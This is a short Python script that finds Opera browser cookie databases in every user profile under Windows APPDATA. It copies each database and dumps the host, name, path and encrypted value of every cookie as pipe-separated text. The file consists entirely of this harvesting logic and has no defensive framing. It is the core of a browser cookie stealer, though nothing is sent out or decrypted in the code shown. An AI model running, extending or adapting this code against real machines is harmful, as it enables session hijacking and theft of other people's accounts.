import os
import sqlite3
import shutil

temp_db = "CookiesVault.db"

def find_cookie_dbs():
    base_path = os.path.join(os.environ['APPDATA'], r'Opera Software\Opera Stable')
    candidates = ["", "Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]
    db_paths = []

    for folder in candidates:
        if folder:
            path = os.path.join(base_path, folder, r"Network\Cookies")
        else:
            path = os.path.join(base_path, r"Network\Cookies")

        if os.path.exists(path):
            db_paths.append((folder or "Default", path))

    return db_paths

if __name__ == '__main__':
    cookie_dbs = find_cookie_dbs()

    for profile, db_path in cookie_dbs:
        print(f"\n[+] Perfil: {profile}")
        shutil.copy2(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()

        cursor.execute("SELECT host_key, name, path, encrypted_value FROM cookies")
        data=""
        for index, cookie in enumerate(cursor.fetchall()):
            host = cookie[0]
            name = cookie[1]
            path = cookie[2]
            encrypted_value = cookie[3]

            data+=f"{index+1}|{host}|{name}|{path}|{encrypted_value}"
        print(data)
        
        cursor.close()
        conn.close()

        try:
            os.remove(temp_db)
        except Exception:
            pass
